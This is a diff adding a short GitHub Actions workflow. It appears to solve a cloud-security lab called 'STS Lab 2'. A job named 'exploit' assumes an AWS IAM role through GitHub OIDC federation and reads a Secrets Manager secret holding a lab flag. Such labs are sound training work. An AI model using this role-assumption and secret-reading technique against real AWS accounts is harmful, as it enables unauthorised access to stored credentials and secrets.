@@ -1,0 +1,23 @@
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: configure aws creds
+        uses: aws-actions/configure-aws-credentials
+        with:
+          role-to-assume: arn:aws:iam::331172489455:role/sts-lab-2-target
+          role-session-name: gha-federated
+          aws-region: us-east-1
+      - name: STS Lab 2
+        env:
+          ROLE_ARN: "arn:aws:iam::331172489455:role/sts-lab-2-target"
+          AWS_REGION: "us-east-1"
+        run: | 
+          aws secretsmanager get-secret-value --secret-id 'arn:aws:secretsmanager:us-east-1:331172489455:secret:flag_sts_lab_2-Ye3vOU'
